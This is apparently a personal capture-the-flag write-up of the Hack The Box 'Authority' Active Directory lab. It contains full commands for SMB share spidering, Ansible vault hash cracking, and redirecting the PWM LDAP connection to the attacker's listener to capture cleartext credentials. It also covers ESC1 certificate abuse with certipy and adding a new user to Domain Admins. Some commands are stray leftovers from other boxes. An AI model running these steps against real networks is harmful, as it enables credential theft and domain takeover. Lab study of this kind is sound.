---
title: Authority
date: 2026-01-05
image: /assets/posts/post-icons/authority.png
description: "Windows Active Directory box with Ansible credential extraction, LDAP exploitation, and ESC1 certificate privilege escalation"
---

```console
10.10.11.222
```
## Nmap
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 22:41:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T22:42:09+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$SMB         10.10.11.222    445    
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-04T22:42:09+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T22:42:09+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T22:42:09+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-10-02T12:08:35
|_Not valid after:  2027-10-04T23:46:59
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
```

Ok so the order of priority for this box is that you should look at smb first, enumerate it fully, get the ansible creds, enumerate the website as well

## SMB

```console
nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
```



![](/assets/posts/img/b3cd30c58736d268ed9aa8019001042d.png)

Guest authentication is enabled and there is READ on the 'Development' share.


![](/assets/posts/img/cdcda3ef8d34a188e1dedb3740c40146.png)

There are hardcoded creds for apache tomcat in clear-text

![](/assets/posts/img/09a25cdc1cb2f3f0eb151f63a8d4259f.png)


we can see there is ansible running to setup the application automatically. 

![](/assets/posts/img/240b07cae8977addee7edeb53631917e.png)

we have ansible administrator creds
![](/assets/posts/img/8344034eaeeef5a35312d33d408b65bf.png)

we have ansible admin ldap vault hashes in main.yml


I'll try to enumerate the various passwords with the pwm application, if that doesn't work we will go onto the hashes.

```console
svc_pwm
svc_ldap
```

```console
 hydra -l ceil -P /opt/SecLists/rockyou.txt ftp://10.129.90.182:2121
```

could try a password spray on the pwm application. We can also try and crack the hashes provided.
## Passwordlist
``` title:Password-List
Welcome1
T0mc@tAdm1n
T0mc@tR00t
```

![](/assets/posts/img/cdcda3ef8d34a188e1dedb3740c40146.png)
userlist has to be the common.txt in seclists

```hash-formated-by-claude
cat > hash << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a3636638443623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
EOF
```

```ansible2john
ansible2john hash > johnhash
```

```
[livid@blackrock ~/Sec/htb/labs/authority]$ john johnhash --wordlist=/opt/SecLists/rockyou.txt
Warning: detected hash type "ansible", but the string is also recognized as "ansible-opencl"
Use the "--format=ansible-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
!@#$%^&*         (hash)
1g 0:00:00:10 DONE (2025-10-04 02:35) 0.09960g/s 3968p/s 3968c/s 3968C/s 051106..teamokaty
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
## Web
https://10.10.11.222:8443/pwm/private/login


```fuzzing-using-common.txt
feroxbuster -u http://$TARGET/ -w /opt/SecLists/Discovery/Web-Content/common.txt
```

```fuzzing-using-raft-medium
feroxbuster -u http://$TARGET/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt
```

```ferox-fuzz-vhosts
feroxbuster -u http://$TARGET -w   /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.inlanefreight.htb"
```


![](/assets/posts/img/d26bf5b69ee1b84a21727d69a78c2b0b.png)


## User List

```sorting-ridbrute
cat ridbrute | awk '{print$6}' | cut -d'\' -f2 | sort -u
```

```
cat ridbrute | grep "SidTypeUser" | awk -F'HTB\\\\' '{print $2}' | awk '{print $1}
```


```
cat ridbrute | grep "SidTypeUser" | awk '{print $6}' | cut -d '\' -f2 | sort -u
```



We can see what the ansiblebooks password is for pwd. Now we have to open the ansiblebook

```hash-password
pWm_@dm!N_!23
```

```
nxc smb $TARGET -u svc_pwm -p 'pWm_@dm!N_!23' --shares
```

![](/assets/posts/img/fbc954c87458ee2653004dde074fc60f.png)

have to use https:// to get in can't use http

![](/assets/posts/img/d2978ca76e1a35e8bfbf815278ec1bcb.png)

we have to use the configuraton editor and then put the password therte it doesn't accept any username we have.


![](/assets/posts/img/17d187e9f4a97377a6058320fa178f42.png)


![](/assets/posts/img/e0c577164bcc5cb93c15633a981bc254.png)
```
ENC-PW:DrNu+qFbW/0Y/mT2gBYi5ySs4s4xL99HxnawE01TEHmMaE/xA1OlQ7UMvq43Nhh6Kue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
```

```config-ldap-bcrypt
$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
```

```ldap-proxy
ENC-PW:6VDYBaFdkZyi159JlPDM9pPMmYbLo3iBiDmDrL7he1tuj1Z13A0Et/GTaAcb476hTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=

```


![](/assets/posts/img/b1a61030b72590654b365380ed0f3add.png)

Need to change ldaps to ldap to make it clear text.

ldap://10.10.14.4:9001
![](/assets/posts/img/976cb086c53593f3155a8fbe51bda69e.png)

It was ldaps before which made it ssl which caused us to not get the creds in cleartext.

## LDAP
We get a connection back to our server on 9001 and see clear-text credentials

```svc_ldap
lDaP_1n_th3_cle4r!
```


```
nxc ldap $TARGET -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

we finally get ldap auth

![](/assets/posts/img/924ac625bd8ad253a5ac8d15225e8dc2.png)

```
certipy find -dn certificate.htb -dc-host DC01.certificate.htb -vulnerable -u 'Lion.SK' -p '!QAZ2wsx' -ns $TARGET
```


```
certipy find -dn authority.htb -vulnerable -u 'Lion.SK' -p '!QAZ2wsx' -ns $TARGET
```

```
certipy find -dn authority.htb -dc-host "AUTHORITY.authority.htb" -vulnerable -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -ns $TARGET -stdout
```


We can see that the corevpn template is vulnerable to ESC1

```
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```


```
certipy find -dn certificate.htb -dc-host DC01.certificate.htb -vulnerable -u 'Lion.SK' -p '!QAZ2wsx' -ns $TARGET
```

```stdout
certipy find -dn authority.htb -dc-host "AUTHORITY.authority.htb" -vulnerable -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -ns $TARGET -stdout
```

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
## ESC1

what we need to look for is this

    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

we need to see that `Client Authentication               : True`

we need to see `Enrollee Supplies Subject           : True`


```
certipy req \
    -u 'schlop$' -p 'Password123!' \
    -dc-ip '10.10.11.222' -target 'authority.htb' \
    -ca 'AUTHORITY-CA' -template 'CorpVPN' \
    -upn 'administrator@authority.htb'
```

```
certipy auth -pfx 'administrator.pfx' -dc-ip $TARGET
```

```
bloodhound-ce-python -d authority.htb -c all  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -ns $TARGET --zip -k
```


We do an ldap shell with the administrator pfx file and then we create our own account and add it to domain admins thus giving us administrator.
## Ldap shell 

```
certipy auth -pfx administrator.pfx -dc-ip $TARGET -domain authority.htb -ldap-shell
```

```
add_user schlop
```

`Password to schlop account is given in the terminal output`

```
add_user_to_group schlop "Domain Admins"
```

```
enable_account schlop
```

![](/assets/posts/img/e6e68e530a9e53a77c171b6bb940e40b.png)
